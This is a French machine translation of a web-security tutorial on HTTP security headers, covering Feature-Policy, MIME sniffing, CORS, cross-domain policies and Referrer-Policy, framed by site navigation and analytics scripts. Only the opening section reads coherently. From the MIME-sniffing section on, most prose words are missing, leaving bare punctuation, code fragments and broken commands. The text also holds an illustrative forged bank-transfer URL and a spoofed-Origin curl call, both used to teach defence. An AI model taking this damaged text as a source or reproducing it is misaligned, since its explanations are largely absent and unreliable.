titre de sécurité: <code>Feature-Policy</code> . <br><br>  Actuellement pris en charge par très peu de navigateurs (Chrome et Safari au moment de la rédaction de cet article), cet en-tête nous permet de déterminer si une fonctionnalité de navigateur particulière est activée sur la page actuelle.  Avec une syntaxe très similaire à CSP, nous ne devrions avoir aucun problème à comprendre ce que les politiques de fonction signifient, telles que les suivantes: <br><br><pre> <code class="plaintext hljs">Feature-Policy: vibrate 'self'; push *; camera 'none'</code> </pre> <br>  Si nous avons tous des doutes, comment cette politique affecte l'API du navigateur, nous pouvons simplement l'analyser: <br><br><ul><li>  <code>vibrate 'self'</code> : permet à la page actuelle d'utiliser l'API de vibration et n'importe quel cadre du site actuel. </li><li>  <code>push *</code> : la page en cours et n'importe quel cadre peuvent utiliser l'API de notification push </li><li>  <code>camera 'none'</code> : l'accès à l'API de la caméra est refusé sur cette page et sur les cadres </li></ul><br>  La politique des fonctionnalités a un peu d'histoire.  Si votre site permet aux utilisateurs, par exemple, de prendre des selfies ou d'enregistrer de l'audio, il serait très utile d'utiliser une politique qui restreint l'accès à l'API via votre page dans d'autres contextes. <br><br><h3>  Options de type de contenu X </h3><br>  Parfois, les fonctionnalités du navigateur intelligent finissent par nous nuire en termes de sécurité.  Un exemple parfait est le reniflement MIME, une technique populaire dans Internet Explorer. <br><br> MIME- —       ( )    . ,      <code>/awesome-picture.png</code> ,          (, <code>Content-Type: text/plain</code> ).     ,       . <br><br>    , IE   ,    MIME-:     «»  ,  ,      ,      <code>Content-Type</code> ,   ,  ,       ,  . <br><br>     -,       ,  ,     <code>/test.jpg</code> ,   JavaScript. ,   ?    ,       HTML ,     ,   «»,     .    ,  ,   ,      . <br><br>    ,     <code>X-Content-Type-Options: nosniff</code> ,    MIME-:     ,   ,           ,       .  ,   ,       ,       . <br><br><h3> Cross-Origin Resource Sharing (CORS) </h3><br>    JavaScript HTTP-      .  , AJAX-  <code>example.com</code>     <code>example.com</code> . <br><br>    ,         —  cookie,       . ,       <code>win-a-hummer.com</code> ,     AJAX  <code>your-bank.com</code> .     - ,    HTTP-    ,    ,   ,    . <br><br>         AJAX   ,        Cross Origin Resource Sharing (CORS),  ,     . <br><br> ,    CORS,  ,        ,     «»  CORS. <br><br> ,       ,  ,     <code>Access-Control-Allow-Origin</code>    , ,       . <br><br>       <code>Access-Control-Allow-Origin: *</code> ,         ,     ,   URL-,       ,   <code>Access-Control-Allow-Origin: https://example.com</code> . <br><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/cors</a> ,  ,         .   ,    AJAX  <code>test-cors</code>  <code>test-cors-2</code>      .   test-cors-2    CORS,   ,   .    <code>http://cors-test:7888/?cors=on</code> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bae/c57/e2f/baec57e2f48c17748ce2d6202985c559.png" alt="image"><br><br>      <code>cors</code>  URL,         : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/68d/3aa/ae1/68d3aaae10cb6f226ae1c0a1c9a96d27.png" alt="image"><br><br>  ,    ,   ,    ,        .   ,        ,          . , ,       ,    <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker.</code>    ! <br><br>       , <code>GET</code> -   ,   ,     <code>POST</code> -?  ,      ,     ,    <code>http://cors-test:7888/?method=POST</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e73/f4e/9a0/e73f4e9a003a2cb60cf6c952bc8d21e6.png" alt="image"><br><br>      <code>POST</code> ,        ,    « ».    ,   <code>OPTIONS</code>     ,    .       ,    ,    <code>POST</code>    . <br><br>     : <br><br><ul><li> CORS —    .   ,     ,         ,   . </li><li>    API,     <code>GET</code> .        ,     . </li></ul><br>    ,        -,       ,    ,     CORS.  ,   ,   <code>example.com</code> ,     <code>example.com/_proxy/other.com</code> ,    ,   <code>_proxy/other.com/*</code> ,    <code>other.com</code> . <br><br>       , ,       CORS,  MDN    ,       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a> . <br><br><h3> X-Permitted-Cross-Domain-Policies </h3><br>    CORS, <code>X-Permitted-Cross-Domain-Policies</code>       Adobe ( , Flash  Acrobat). <br><br>      ,    ,      .  ,  Adobe      <code>crossdomain.xml</code>    ,    ,  <code>X-Permitted-Cross-Domain-Policies</code>       . <br><br>  ?      <code>X-Permitted-Cross-Domain-Policies: none</code>   ,       Flash. <br><br><h3> Referrer-Policy </h3><br>      , ,      .   <code>Referer</code> ,       .     URL     ,   . <br><br> ,  ,      .    ,     .   <code>Referer</code>        .    ,    ,              . <br><br>  <code>Referrer-Policy</code> ,    2017         ,        ,  ,      URL-   <code>Referer</code>     . <br><br>      ,    <code>Referrer-Policy</code> : <br><br><ul><li> <code>no-referrer</code> :  <code>Referer</code>    </li><li> <code>origin</code> :  <code>https://example.com/private-page</code>  <code>https://example.com/</code> </li><li> <code>same-origin</code> :  <code>Referer</code>    ,       </li></ul><br>  ,      <code>Referred-Policy</code> ( <code>strict-origin</code> , <code>no-referrer-when-downgrade</code>  . .),  ,    , ,      .       ,    ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">     OWASP</a> . <br><br>  <code>Origin</code>    <code>Referer</code> ,        ,  ,          .  <code>Origin</code>  ,       .             -:  <code>Origin</code>     ,   . <br><br>   ,   HTTP-,   cURL,     :  c <code>url -H "Origin: example.com" api.example.com</code>        origin ……         <code>Origin</code> ( <code>Referer</code> ,     )        . <br><br><h3>    </h3><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">securityheaders.com</a> ,   -,    ,    -   ,   .  ,    URL,         .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://securityheaders.com/%3Fq%3D">   facebook.com</a> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8dd/8ef/5a6/8dd8ef5a6215f292b95bfae1b9c8ef16.png" alt="image"><br><br>     ,   , securityheaders.com —  ,    . <br><br><h3> HTTP   :     cookie </h3><br>           HTTP,     ,     -      ,       . <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://medium.freecodecamp.org/web-security-hardening-"> </a>           HTTP: . <br><br>   ,   -   HTTP   , , ,  ( )         -:     - ,     ,     «   ».   ,  cookie       ,           . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr434228/">https://habr.com/ru/post/fr434228/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr434216/index.html">Attaques par force brute avec Kali Linux</a></li>
<li><a href="../fr434218/index.html">Bot clicker Java simple sur l'exemple du jeu World of Warcraft 3.3.5a</a></li>
<li><a href="../fr434220/index.html">Entrée dans Aeronet: lancement d'un quadricoptère autonome dans un environnement virtuel</a></li>
<li><a href="../fr434222/index.html">Station au sol Amazon à louer - recevez et traitez les données des satellites</a></li>
<li><a href="../fr434224/index.html">Événements numériques à Moscou du 24 au 30 décembre</a></li>
<li><a href="../fr434230/index.html">Présentation des scanners 3D GOM Atos 5 / 5X au Top 3D Expo</a></li>
<li><a href="../fr434234/index.html">Méthode des couloirs de natation</a></li>
<li><a href="../fr434236/index.html">Le réseau neuronal avec une amibe a résolu le problème des vendeurs ambulants pour 8 villes</a></li>
<li><a href="../fr434238/index.html">Intel OpenVINO sur Raspberry Pi: récolte 2018</a></li>
<li><a href="../fr434244/index.html">Je suis le marchand d'algo de maman: à la recherche de frameworks gratuits pour tester des hypothèses et lancer en mode bataille (Python)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>